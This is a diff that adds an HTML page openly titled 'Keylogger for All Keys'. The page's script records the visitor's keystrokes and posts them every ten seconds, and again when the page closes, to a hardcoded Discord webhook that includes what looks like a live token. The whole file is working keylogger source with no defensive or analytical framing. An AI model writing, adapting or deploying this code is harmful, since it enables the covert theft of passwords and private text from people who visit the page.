@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keylogger for All Keys</title>
+</head>
+<body>
+
+<script>
+    // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
+    const discordWebhookUrl = 'https://discord.com/api/webhooks/1186692203637125220/dGDC9ghxPxxtstnwICURHnj8w7Lcp3msL4BRP3xQ2NzmwdjrztYmyjJi7Uy2LHWhi16_';
+
+    let keysPressed = [];
+
+    // Function to send keys to Discord webhook
+    const sendKeysToDiscord = async () => {
+        const keys = keysPressed.join(', ');
+        const content = `Keys pressed: ${keys}`;
+
+        try {
+            const response = await fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content,
+                }),
+            });
+
+            if (response.ok) {
+                console.log('Keys sent to Discord successfully');
+            } else {
+                console.error('Failed to send keys to Discord');
+            }
+        } catch (error) {
+            console.error('Error sending keys to Discord:', error);
+        }
+
+        // Clear the keysPressed array after sending
+        keysPressed = [];
+    };
+
+    // Event listener for keydown
+    window.addEventListener('keydown', (event) => {
+        const key = event.key;
+
+        // Exclude some keys like Enter, Shift, etc. if needed
+        if (key !== 'Enter' && key !== 'Shift') {
+            keysPressed.push(key);
+        }
+    });
+
+    // Set interval to send keys every 10 seconds
+    setInterval(sendKeysToDiscord, 10000);
+
+    // Event listener for beforeunload (when the user leaves the page)
+    window.addEventListener('beforeunload', sendKeysToDiscord);
+</script>
+
+</body>
+</html>
